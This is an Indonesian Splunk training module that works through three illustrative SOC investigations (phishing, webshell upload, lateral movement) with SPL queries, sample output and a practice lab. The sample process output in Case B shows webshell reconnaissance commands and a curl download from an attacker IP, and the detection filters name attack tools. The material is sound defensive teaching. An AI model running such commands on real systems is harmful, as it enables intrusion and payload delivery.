---
day: 35
title: 'Tiga studi kasus investigasi dengan SPL: phishing, serangan web, dan lateral movement'
researched_on: 2026-10-10
versions_checked: 'Splunk Enterprise 10.6 (SPL); CIM 6.4 (Email, Web, Network Traffic, Authentication, Endpoint); MITRE ATT&CK v19.2; rujukan Day 01-05, 11, 18, 23, 32, 33'
---

# Day 35: Studi kasus investigasi end-to-end

Cakupan: tiga investigasi lengkap dari pemicu sampai kesimpulan, masing-masing dengan rantai SPL berurutan, pertanyaan di tiap langkah, dan isi laporannya, sebagai sintesis command dan konsep dari Day sebelumnya.

## 1. Tujuan belajar

Setelah menyelesaikan Day ini, kamu bisa:

- menjalankan investigasi phishing dari laporan pengguna sampai penilaian dampak kredensial.
- menginvestigasi dugaan serangan web dari alert IDS sampai pembuktian eksekusi di server.
- melacak lateral movement dari satu login tidak lazim sampai pemetaan host yang tersentuh.
- memilih pertanyaan berikutnya berdasarkan bukti, bukan berdasarkan kebiasaan.
- menyatakan kesimpulan dengan tingkat keyakinan dan menyebut keterbatasan data.
- mengubah setiap investigasi menjadi satu usulan deteksi atau hunt baru.

## 2. Konteks singkat

Day 18 memberi lima tahap investigasi, Day 33 memberi tempat mencatatnya. Yang belum ada: contoh utuh. Day ini mengisi kekosongan itu dengan tiga kasus yang paling sering datang ke SOC, dan ketiganya dipilih karena pola pivotnya berbeda:

- **Phishing** dimulai dari manusia dan bergerak ke identitas. Pertanyaan utamanya: apakah kredensial dipakai.
- **Serangan web** dimulai dari sinyal jaringan dan bergerak ke proses di server. Pertanyaan utamanya: apakah eksploitasi berhasil.
- **Lateral movement** dimulai dari satu identitas dan bergerak melintasi host. Pertanyaan utamanya: sampai mana penyerang sudah masuk.

Semua data dan nama di sini fiktif atau dari lab. Query memakai field CIM supaya bisa dipindahkan antar lingkungan (Day 11), dengan catatan di tempat yang bergantung TA.

**Kapan dipakai:** sebagai latihan sebelum shift nyata; sebagai kerangka saat menghadapi kasus serupa; sebagai bahan cerita terstruktur saat interview.

## 3. Konsep inti

### 3.1 Kerangka pivot: empat sudut yang selalu sama

Investigasi apa pun berputar di empat sudut yang saling menguatkan:

| Sudut | Pertanyaan | Sumber data khas |
|---|---|---|
| Identitas | Siapa yang melakukan, akun apa yang dipakai | Authentication, direktori, log aplikasi |
| Aset | Di host atau layanan mana | Endpoint, inventory, Asset and Identity (Day 10) |
| Jaringan | Dari mana dan ke mana | Proxy, firewall, DNS, Network Traffic |
| Eksekusi | Apa yang dijalankan atau diubah | Process creation, file, registry, service |

Investigasi yang macet hampir selalu karena berputar di satu sudut saja. Bila kamu sudah tiga query berada di sudut jaringan tanpa kemajuan, pindah ke sudut eksekusi.

### 3.2 Urutan pertanyaan standar

Enam pertanyaan ini dipakai berurutan, dan jawabannya ditulis di note sebelum lanjut:

1. **Apa yang sebenarnya terjadi?** Pastikan pemicu itu nyata, bukan uji atau salah parsing (Day 30).
2. **Kapan pertama kali?** Tentukan T0. Semua pertanyaan berikutnya memakai jendela waktu dari T0.
3. **Siapa dan apa yang terlibat?** Daftar entitas: user, host, IP, domain, file.
4. **Berhasil atau tidak?** Bedakan upaya dari keberhasilan. Ini pertanyaan paling menentukan dan paling sering dilewati.
5. **Apa yang terjadi setelahnya?** Cari eksekusi, persistence, pergerakan, dan transfer data.
6. **Apa yang belum bisa dilihat?** Daftar keterbatasan data yang masuk ke laporan.

### 3.3 Jejak minimum per jenis kasus

Sebelum investigasi, pastikan kamu tahu data mana yang ada. Daftar ini juga berguna sebagai argumen onboarding (Day 12 dan Day 31):

| Kasus | Jejak minimum yang membuat investigasi mungkin |
|---|---|
| Phishing | Metadata email (pengirim, penerima, subjek, lampiran, verdict), log proxy atau DNS, log autentikasi aplikasi termasuk MFA, log perubahan aturan mailbox |
| Serangan web | Access log server web lengkap (status, metode, URI, user agent, ukuran), alert IDS atau WAF, process creation di server, perubahan file di direktori web |
| Lateral movement | Autentikasi dengan tipe logon dan host sumber, process creation, pembuatan service dan scheduled task, koneksi SMB atau RDP, akses share administratif |

## 4. Studi kasus dengan SPL

> Keluaran berlabel ilustrasi. Index dan sourcetype mengikuti lab sendiri; field CIM dipakai agar query bisa dipindahkan. IOC ditulis dengan domain `.example` dan IP dokumentasi.

### 4.1 Kasus A: laporan phishing dari pengguna

**Pemicu:** seorang pengguna melaporkan email mencurigakan yang mengaku dari bagian HR dengan tautan ke portal "verifikasi data". Ia tidak yakin apakah sempat memasukkan password.

**Langkah A1. Temukan email itu dan sebarannya.**

```
| tstats summariesonly=false count values(All_Email.recipient) AS penerima
    values(All_Email.subject) AS subjek min(_time) AS pertama max(_time) AS terakhir
    from datamodel=Email.All_Email
    where All_Email.src_user="*hr-verifikasi*" OR All_Email.subject="*verifikasi data*"
      earliest=-7d by All_Email.src_user All_Email.internal_message_id
| rename All_Email.* AS *
| eval pertama=strftime(pertama,"%F %T"), terakhir=strftime(terakhir,"%F %T")
| sort - count
```

Keluaran ilustrasi:

```
src_user                      internal_message_id  count  penerima                   subjek                pertama              terakhir
hr-verifikasi@bad-hr.example  <a19f...@mx1>        14     alice bob charlie ...      Verifikasi data karyawan  2026-10-08 08:11:02  2026-10-08 08:11:40
```

Cara membacanya: 14 penerima berarti ini kampanye, bukan kejadian tunggal. Daftar penerima menjadi lingkup investigasi. Jangan berhenti pada pelapor.

**Langkah A2. Siapa yang mengklik.** Pivot ke sudut jaringan, memakai domain tautan:

```
| tstats summariesonly=false count values(Web.user) AS user values(Web.src) AS src
    min(_time) AS klik_pertama from datamodel=Web.Web
    where Web.url="*portal-hr-verifikasi.example*" earliest=-7d by Web.dest
| rename Web.* AS *
| eval klik_pertama=strftime(klik_pertama,"%F %T")
```

Bila proxy tidak mencatat user, pakai DNS dan korelasikan lewat `src`:

```
| tstats summariesonly=false count from datamodel=Network_Resolution.DNS
    where DNS.query="*portal-hr-verifikasi.example*" earliest=-7d by DNS.src DNS.query
| rename DNS.* AS *
```

**Langkah A3. Apakah kredensial dipakai.** Ini pertanyaan nomor empat dari bagian 3.2, dan jawabannya menentukan tingkat keparahan:

```
index=lab_auth OR index=lab_cloud_signin earliest=-7d
    user IN ("alice","bob","charlie")
| eval berhasil=if(action="success",1,0)
| stats count sum(berhasil) AS sukses values(src) AS sumber values(app) AS aplikasi
        dc(src) AS jumlah_sumber min(_time) AS awal max(_time) AS akhir BY user
| eval awal=strftime(awal,"%F %T"), akhir=strftime(akhir,"%F %T")
| sort - jumlah_sumber
```

Keluaran ilustrasi:

```
user     count  sukses  sumber                        aplikasi        jumlah_sumber  awal                 akhir
alice    52     3       10.20.4.18 203.0.113.50       webmail,vpn     2       2026-10-08 08:14:55  2026-10-08 09:02:11
bob      18     18      10.20.4.31                    webmail         1       2026-10-08 07:50:02  2026-10-08 17:44:51
```

Cara membacanya: `alice` punya login sukses dari IP yang bukan jaringan internal, tak lama setelah klik. Itu indikasi kredensial dipakai pihak lain. `bob` hanya login dari dalam, jadi ia kemungkinan mengklik tanpa memasukkan kredensial, atau tidak mengklik sama sekali.

**Langkah A4. Apa yang dilakukan setelah login.** Untuk kasus email, dua hal yang paling sering dan paling merusak adalah aturan penerusan email dan pendaftaran metode MFA baru:

```
index=lab_cloud_audit earliest=-7d user="alice"
    (operation IN ("New-InboxRule","Set-InboxRule","Set-Mailbox","Add-MailboxPermission")
     OR operation="*MFA*" OR operation="*StrongAuthentication*")
| table _time user operation src parameters
| sort _time
```

Nama operasi di atas mengikuti log mailbox dan identitas awan; nama persisnya bergantung penyedia dan TA yang kamu pakai, jadi cek di instance-mu sebelum memakainya di detection.

**Langkah A5. Cari korban lain yang belum melapor.** Gabungkan dua sudut: penerima email dan login dari IP yang sama:

```
index=lab_auth OR index=lab_cloud_signin earliest=-7d src="203.0.113.50"
| stats count values(action) AS aksi min(_time) AS awal BY user
| eval awal=strftime(awal,"%F %T")
| sort awal
```

Satu IP yang dipakai untuk beberapa akun mengubah kasus ini dari satu korban menjadi insiden. Pivot seperti ini yang paling sering menyelamatkan investigasi dari kesimpulan terlalu kecil.

**Kesimpulan dan laporan (ilustrasi).** Keyakinan sedang sampai tinggi bahwa kredensial `alice` dipakai pihak luar pada 2026-10-08 08:14 dari 203.0.113.50; tidak ada bukti akses ke akun lain dari IP itu; aturan mailbox tidak berubah. Keterbatasan: log proxy tidak mencatat user, sehingga klik hanya bisa dikaitkan lewat IP sumber; MFA log hanya tersedia 30 hari.

**Tindakan:** reset kredensial dan cabut sesi, blokir domain di proxy dan email, kirim pemberitahuan ke 14 penerima, tambahkan domain ke threat list (Day 33).

**Deteksi baru yang lahir dari kasus ini:** login sukses dari IP non-korporat dalam 60 menit setelah akses ke domain yang baru pertama kali terlihat (memakai tabel first-seen domain dari Day 32).

### 4.2 Kasus B: alert IDS pada aplikasi web

**Pemicu:** satu alert IDS bertanda percobaan eksploitasi terhadap server aplikasi lab, dengan tanda tangan berkaitan unggahan file.

**Langkah B1. Pastikan alert nyata dan tentukan T0.**

```
| tstats summariesonly=false count values(IDS_Attacks.signature) AS signature
    min(_time) AS awal max(_time) AS akhir from datamodel=Intrusion_Detection.IDS_Attacks
    where IDS_Attacks.dest="10.20.9.40" earliest=-24h by IDS_Attacks.src IDS_Attacks.severity
| rename IDS_Attacks.* AS *
| eval awal=strftime(awal,"%F %T"), akhir=strftime(akhir,"%F %T")
| sort - count
```

Alert IDS hanya memberi tahu ada percobaan. Keberhasilan dinilai dari log aplikasi, bukan dari IDS.

**Langkah B2. Lihat jejaknya di access log.** Yang dicari: kombinasi metode, status, dan ukuran respons yang menandakan sesuatu berhasil:

```
| tstats summariesonly=false count values(Web.status) AS status
    values(Web.http_method) AS metode sum(Web.bytes_out) AS total_keluar
    from datamodel=Web.Web where Web.dest="10.20.9.40" Web.src="203.0.113.77"
      earliest=-24h by Web.uri_path
| rename Web.* AS *
| sort - count
| head 20
```

Keluaran ilustrasi:

```
uri_path                     count  status      metode      total_keluar
/app/upload.php              31     200,403     POST,GET    18422
/app/uploads/img_9f12.php    6      200         GET,POST    240112
/app/login.php               88     401,200     POST        9120
```

Cara membacanya: baris kedua adalah tanda bahaya. Sebuah file `.php` di dalam direktori unggahan yang diakses dengan status 200 dan mengembalikan data besar adalah pola webshell klasik. Urutan waktunya perlu diperiksa:

```
| tstats summariesonly=false count from datamodel=Web.Web
    where Web.dest="10.20.9.40" Web.uri_path IN ("/app/upload.php","/app/uploads/img_9f12.php")
      earliest=-24h by _time span=1m Web.uri_path Web.src
| rename Web.* AS *
| sort _time
```

Bila `upload.php` diakses sesaat sebelum `img_9f12.php` muncul, rangkaiannya jelas: unggah lalu eksekusi.

**Langkah B3. Buktikan eksekusi di server.** Pindah ke sudut eksekusi. Webshell terlihat sebagai proses anak dari proses web server:

```
| tstats summariesonly=false count values(Processes.process) AS command
    min(_time) AS awal from datamodel=Endpoint.Processes
    where Processes.dest="LAB-WEB-01"
      Processes.parent_process_name IN ("httpd","php-fpm","w3wp.exe","nginx")
      earliest=-24h by Processes.process_name Processes.user
| rename Processes.* AS *
| eval awal=strftime(awal,"%F %T")
| sort awal
```

Keluaran ilustrasi:

```
process_name  user      count  command                                     awal
sh            www-data  4      sh -c id;uname -a;cat /etc/passwd            2026-10-09 10:22:41
curl          www-data  1      curl -s http://203.0.113.77:8080/l -o /tmp/l 2026-10-09 10:24:02
```

Ini bukti eksekusi, dan statusnya berubah dari "percobaan" menjadi "berhasil, dengan eksekusi perintah". Keyakinan naik menjadi tinggi.

**Langkah B4. Cari persistence dan pergerakan.**

```
| tstats summariesonly=false count values(Filesystem.file_path) AS path
    from datamodel=Endpoint.Filesystem
    where Filesystem.dest="LAB-WEB-01" Filesystem.action="created"
      earliest=-24h by Filesystem.file_name
| rename Filesystem.* AS *
| search file_name IN ("*.php","*.jsp","*.aspx","*.sh") OR path IN ("/etc/cron*","*/systemd/*")
| sort - count
```

```
| tstats summariesonly=false count from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.src="10.20.9.40" NOT All_Traffic.dest IN ("10.20.0.0/16")
      earliest=-24h by All_Traffic.dest All_Traffic.dest_port
| rename All_Traffic.* AS *
| sort - count
```

Server web yang memulai koneksi keluar ke internet adalah anomali di sebagian besar arsitektur. Bila ada, itu jalur unduhan tool atau C2.

**Kesimpulan dan laporan (ilustrasi).** Keyakinan tinggi bahwa unggahan file tanpa validasi di `/app/upload.php` dipakai untuk menanam webshell pada 2026-10-09 10:21, lalu dipakai menjalankan perintah pengintaian dan mengunduh satu berkas. Tidak ada bukti pergerakan ke host lain dalam 24 jam. Keterbatasan: akses log hanya 7 hari di lab ini, dan tidak ada EDR di LAB-WEB-01 sehingga bukti eksekusi hanya dari Sysmon untuk Linux.

**Tindakan:** isolasi server, simpan salinan file webshell beserta hash-nya dan, bila memungkinkan, akuisisi memori server sebelum dimatikan, karena proses yang dijalankan lewat webshell sering hanya terlihat di memori, hapus webshell setelah bukti disimpan, perbaiki validasi unggahan, blokir IP, dan periksa seluruh direktori unggahan untuk file lain.

**Deteksi baru:** proses anak non-standar dari proses web server, dan permintaan HTTP sukses ke file skrip di dalam direktori unggahan.

### 4.3 Kasus C: satu login tidak lazim yang ternyata lateral movement

**Pemicu:** finding dari baseline login (Day 32 bagian 4.1): akun `svc_backup` login pada jam yang tidak biasa.

**Langkah C1. Pahami akun dan konteksnya.**

```
| inputlookup identity_lookup_expanded where identity="svc_backup"
| table identity, category, priority, bunit, managedBy
```

Akun layanan yang punya hak administratif mengubah seluruh penilaian risiko. Konteks aset dan identitas (Day 10) adalah langkah pertama, bukan pelengkap.

**Langkah C2. Petakan semua autentikasi akun itu, dengan tipe logon.**

```
| tstats summariesonly=false count min(_time) AS awal max(_time) AS akhir
    from datamodel=Authentication.Authentication
    where Authentication.user="svc_backup" earliest=-7d
    by Authentication.dest Authentication.src Authentication.action Authentication.signature
| rename Authentication.* AS *
| eval awal=strftime(awal,"%F %T"), akhir=strftime(akhir,"%F %T")
| sort awal
```

Keluaran ilustrasi:

```
dest          src           action   signature                          count  awal                 akhir
LAB-SRV-FS01  LAB-WS-07     success  An account was successfully logged on  2    2026-10-09 02:58:10  2026-10-09 02:58:12
LAB-SRV-DB02  LAB-SRV-FS01  success  An account was successfully logged on  1    2026-10-09 03:14:40  2026-10-09 03:14:40
LAB-SRV-APP03 LAB-SRV-FS01  failure  An account failed to log on            6    2026-10-09 03:19:02  2026-10-09 03:21:55
```

Cara membacanya: polanya berantai. Workstation ke file server, lalu file server ke database. Percobaan gagal ke host ketiga menunjukkan penyerang masih mencari. Host asal (LAB-WS-07) menjadi pertanyaan berikutnya: kenapa akun layanan dipakai dari workstation?

**Langkah C3. Periksa host asal.**

```
| tstats summariesonly=false count values(Processes.process) AS command
    from datamodel=Endpoint.Processes
    where Processes.dest="LAB-WS-07" earliest=-1d
      (Processes.process="*svc_backup*" OR Processes.process_name IN ("psexec.exe","wmic.exe","powershell.exe","runas.exe","mstsc.exe"))
    by Processes.process_name Processes.user Processes.parent_process_name
| rename Processes.* AS *
| sort - count
```

Bila terlihat `runas` atau PowerShell dengan kredensial eksplisit, maka kredensial akun layanan berada di workstation itu, dan pertanyaannya menjadi dari mana kredensial itu didapat (dumping, skrip dengan password tertanam, atau penyimpanan kredensial).

**Langkah C4. Cari jejak eksekusi remote di host tujuan.**

```
| tstats summariesonly=false count values(Services.service_path) AS path
    from datamodel=Endpoint.Services where Services.dest IN ("LAB-SRV-FS01","LAB-SRV-DB02")
      earliest=-1d by Services.service_name Services.dest
| rename Services.* AS *
| sort - count
```

```
index=lab_wineventlog earliest=-1d host IN ("LAB-SRV-FS01","LAB-SRV-DB02")
    (EventCode=7045 OR EventCode=4698 OR EventCode=4697)
| table _time host EventCode Service_Name Task_Name Account_Name
| sort _time
```

Event 7045 (service baru), 4697 (service dipasang), dan 4698 (scheduled task dibuat) adalah tiga jejak eksekusi remote yang paling sering tertinggal. Keduanya stabil dan layak dihafal.

**Langkah C5. Cari tanda pengumpulan dan transfer data.**

```
| tstats summariesonly=false count values(Processes.process) AS command
    from datamodel=Endpoint.Processes
    where Processes.dest IN ("LAB-SRV-FS01","LAB-SRV-DB02")
      Processes.process_name IN ("7z.exe","rar.exe","tar","zip","rclone.exe","curl.exe","bitsadmin.exe")
      earliest=-2d by Processes.process_name Processes.dest Processes.user
| rename Processes.* AS *
| sort - count
```

```
| tstats summariesonly=false sum(All_Traffic.bytes_out) AS keluar
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.src IN ("10.20.9.0/24") earliest=-2d
    by All_Traffic.src All_Traffic.dest
| rename All_Traffic.* AS *
| eval keluar_MB=round(keluar/1024/1024,1)
| where keluar_MB>200
| sort - keluar_MB
```

**Langkah C6. Tentukan batas insiden.** Daftar host dan akun yang tersentuh adalah hasil akhir yang paling dibutuhkan tim respons:

```
| tstats summariesonly=false count from datamodel=Authentication.Authentication
    where Authentication.user="svc_backup" Authentication.action="success" earliest=-30d
    by Authentication.dest
| rename Authentication.* AS *
| eventstats sum(count) AS total
| eval persen=round(count/total*100,1)
| sort - count
```

Rentang 30 hari dipakai di sini untuk membedakan perilaku normal akun itu dari perilaku baru. Host yang baru pertama kali muncul dalam 30 hari adalah kandidat host terdampak.

**Kesimpulan dan laporan (ilustrasi).** Keyakinan sedang sampai tinggi bahwa kredensial `svc_backup` disalahgunakan dari LAB-WS-07 pada 2026-10-09 02:58, lalu dipakai mengakses dua server dan mencoba server ketiga; ada pembuatan service baru di LAB-SRV-FS01 dan satu arsip 340 MB yang dibuat tanpa transfer keluar yang terdeteksi. Keterbatasan: tidak ada log proses di LAB-SRV-DB02 selama empat jam karena agent mati, sehingga aktivitas di sana tidak bisa dipastikan.

**Tindakan:** rotasi kredensial akun layanan, isolasi LAB-WS-07 dan LAB-SRV-FS01, akuisisi untuk forensik, periksa penyimpanan kredensial di skrip, dan pasang kembali agent di DB02.

**Deteksi baru:** akun layanan melakukan logon interaktif atau remote interactive; akun layanan login ke host yang tidak pernah dipakainya dalam 30 hari (first-seen per pasangan akun dan host, Day 32).

### 4.4 Pola yang terulang di tiga kasus

| Pola | Kasus A | Kasus B | Kasus C |
|---|---|---|---|
| Pemicu tidak membuktikan keberhasilan | Laporan pengguna | Alert IDS | Baseline anomali |
| Bukti keberhasilan ada di sudut lain | Login sukses dari IP luar | Proses anak web server | Service baru di host tujuan |
| Lingkup selalu lebih luas dari pemicu | 14 penerima | Direktori unggahan lain | Host berantai |
| Keterbatasan data menentukan kalimat kesimpulan | Proxy tanpa user | Tidak ada EDR | Agent mati 4 jam |
| Setiap kasus melahirkan deteksi baru | First-seen domain | Proses anak non-standar | First-seen akun dan host |

## 5. Lab praktik

**Prasyarat:** Splunk lab dengan data autentikasi, proses, web, dan DNS (Day 09 sampai Day 11), satu VM Windows dan satu VM Linux, serta izin menjalankan aktivitas jinak di VM lab.

1. Siapkan tiga skenario jinak di lab: (a) kirim email internal berisi tautan ke server web lab dan klik dari satu VM; (b) unggah file teks berekstensi `.php` yang hanya mencetak tanggal ke aplikasi lab, lalu akses; (c) login dari satu VM ke VM lain dengan akun uji, buat service jinak, lalu buat arsip berisi file dummy.
2. Untuk setiap skenario, tulis T0 dan daftar entitas sebelum menjalankan query apa pun.
3. Jalankan rantai query kasus A, B, dan C terhadap data lab-mu. Catat query mana yang perlu disesuaikan karena nama field berbeda, lalu tulis versi final milikmu.
4. Untuk setiap kasus, jawab enam pertanyaan standar di bagian 3.2 secara tertulis.
5. Tulis tiga laporan satu halaman dengan struktur: ringkasan, timeline, temuan dengan bukti, penilaian dengan keyakinan, keterbatasan, dan tindakan.
6. Dari setiap kasus, turunkan satu detection baru. Tulis logikanya, uji dengan data lab, dan catat perkiraan false positive-nya (Day 23).
7. Ukur dirimu: berapa lama dari pemicu sampai kesimpulan untuk tiap kasus, dan query mana yang paling banyak membuang waktu. Perbaiki yang terakhir dengan teknik Day 05.
8. Simpan ketiga rantai query sebagai macro atau saved search bernama jelas, supaya bisa dipakai ulang saat kasus nyata datang.

**Hasil yang sebaiknya tersimpan:**
- Tiga laporan satu halaman (ini bahan portofolio dan bahan interview terbaik dari seluruh topik Splunk).
- Tiga rantai query final yang sudah disesuaikan dengan lab-mu.
- Tiga usulan detection beserta hasil ujinya.
- Catatan waktu dan hambatan per kasus.

## 6. Troubleshooting

| Gejala | Kemungkinan penyebab | Cara memeriksa |
|---|---|---|
| Data model mengembalikan kosong | `summariesonly=true` padahal summary belum lengkap, atau data belum ter-CIM | Jalankan dengan `summariesonly=false`; cek tag dan eventtype (Day 09) |
| Nama field CIM tidak ada | TA tidak terpasang atau versi CIM berbeda | `\| datamodel Email All_Email search \| head 1` lalu periksa field yang tersedia |
| Login sukses tidak terlihat padahal pasti terjadi | Log autentikasi aplikasi tidak di-onboard, atau hanya kegagalan yang dikirim | Cek `\| tstats count by sourcetype` untuk index autentikasi |
| Tidak ada proses anak web server | Tidak ada agen endpoint di server web, atau proses tidak tercatat | Verifikasi agent; cek `index=_internal` untuk host itu |
| Korelasi IP tidak nyambung | NAT atau proxy mengganti IP sumber | Pakai identitas (user) atau header `x-forwarded-for` bila ada |
| Rentang waktu berbeda antar sumber | Timezone salah di salah satu sumber | Bandingkan event yang sama di dua sumber (Day 30 bagian 3.6) |
| Query lambat saat investigasi mendesak | Rentang terlalu lebar, `index=*`, wildcard di depan | Perbaiki dengan Day 05; simpan versi cepat sebagai saved search |
| Kesimpulan berubah setelah data terlambat masuk | Ingest lag | Ulangi query kunci setelah beberapa jam; catat di note |

## 7. Kesalahan umum dan jebakan

- Berhenti pada pemicu. Satu laporan phishing berarti satu kampanye; satu alert IDS berarti periksa seluruh layanan.
- Menyimpulkan keberhasilan dari alert pencegahan. Alert IDS atau WAF yang memblokir adalah bukti percobaan, bukan bukti keberhasilan.
- Memakai kata "terkonfirmasi" tanpa menyebut bukti dan keyakinan.
- Mengabaikan konteks identitas. Akun layanan, akun admin, dan akun biasa punya arti berbeda untuk perilaku yang sama.
- Mencari hanya di sudut yang nyaman, biasanya jaringan, lalu menyatakan tidak ada bukti eksekusi padahal data eksekusinya tidak pernah dicek.
- Menulis laporan tanpa keterbatasan data, sehingga pembaca menganggap cakupannya penuh.
- Menghapus artefak (webshell, service) sebelum menyimpan bukti.
- Menutup kasus tanpa menurunkan satu pun deteksi atau hunt baru, sehingga kejadian yang sama akan ditemukan dengan cara yang sama lambatnya.

## 8. Catatan terkini

- Dengan makin banyaknya layanan awan, sudut identitas sering lebih kaya daripada sudut jaringan. Untuk phishing modern, log sign-in dan audit identitas awan sering menjadi bukti utama, bukan log proxy.
- Phishing yang mencuri token sesi (adversary-in-the-middle) tidak selalu menunjukkan login gagal lalu sukses. Tandanya justru sesi valid dari lokasi baru tanpa prompt MFA. Pastikan log sign-in-mu memuat informasi MFA dan agen pengguna.
- Untuk serangan web, makin banyak penyerang memakai jalur yang tidak meninggalkan file (eksekusi langsung lewat deserialisasi atau template injection), sehingga pembuktian dari proses anak lebih penting daripada mencari file baru.
- ATT&CK v19 memecah Defense Evasion menjadi Stealth dan Defense Impairment, jadi pemetaan teknik di laporan lama perlu disesuaikan (Day 17).
- Pola "first-seen" (Day 32) terbukti menjadi pembeda paling efisien dalam ketiga kasus di atas, dan biayanya kecil. Bila hanya satu hal yang bisa kamu tambahkan ke lab setelah Day ini, tabel first-seen adalah pilihan terbaik.

## 9. Cheat sheet

```
PIVOT     identitas | aset | jaringan | eksekusi   -> macet? pindah sudut
URUTAN    nyata? -> T0 -> entitas -> berhasil? -> setelahnya? -> yang tak terlihat?
PHISHING  Email.All_Email (pengirim/subjek/penerima) -> Web/DNS (klik) -> Authentication (sukses dari IP luar) -> audit mailbox/MFA -> cari korban lain lewat IP
WEB       IDS_Attacks (percobaan) -> Web.Web (status+metode+bytes_out per uri_path) -> Endpoint.Processes (anak dari httpd/php-fpm/w3wp) -> Filesystem (file baru) -> All_Traffic (keluar)
LATERAL   identity_lookup (konteks) -> Authentication (dest/src/action per host) -> Processes di host asal -> 7045/4697/4698 di tujuan -> arsip+bytes_out -> daftar host 30 hari
BUKTI     percobaan != keberhasilan ; alert pencegahan = percobaan ; eksekusi dibuktikan di endpoint
LAPORAN   ringkasan | timeline insiden | temuan+bukti | penilaian+keyakinan | keterbatasan | tindakan+pemilik
TUTUP     disposition (Day 19) + satu deteksi/hunt baru + satu baris pelajaran
```

## 10. Sumber

| ID | Judul | URL | Tipe | Terbit/diakses | Keandalan dan catatan |
|---|---|---|---|---|---|
| S1 | Splunk Common Information Model 6.4: data model Email, Web, Network Traffic, Authentication, Endpoint, Intrusion Detection | https://help.splunk.com/en/data-management/common-information-model | primer | dirujuk 2026-10-09 | Tinggi untuk nama field CIM; ketersediaan field bergantung TA yang dipakai |
| S2 | MITRE ATT&CK v19: T1566 (Phishing), T1505.003 (Web Shell), T1021 (Remote Services), T1543.003 (Windows Service), T1053.005 (Scheduled Task) | https://attack.mitre.org/techniques/enterprise/ | primer | dirujuk 2026-10-09 | Tinggi. ID teknik stabil |
| S3 | Microsoft Learn: daftar event keamanan Windows (4624, 4625, 4697, 4698, 7045) | https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor | primer | dirujuk 2026-10-09 | Tinggi untuk arti event ID |
| S4 | Splunk-Notes Day 05 (search efisien), Day 10 (Asset and Identity), Day 11 (field CIM), Day 18 (lima tahap), Day 23 (detection), Day 32 (first-seen), Day 33 (investigation dan laporan) | (lokal) | rujukan internal | 2026-10-09 | Keterkaitan antar Day |

**Catatan sumber:** nama operasi di log audit mailbox dan identitas awan berbeda antar penyedia dan antar TA, jadi bagian 4.1 langkah A4 perlu disesuaikan di instance sendiri. Semua keluaran adalah ilustrasi; angka dan nama host fiktif. Rantai query diuji secara logika terhadap struktur CIM 6.4, dan tetap perlu dijalankan di lab untuk memastikan ketersediaan field.
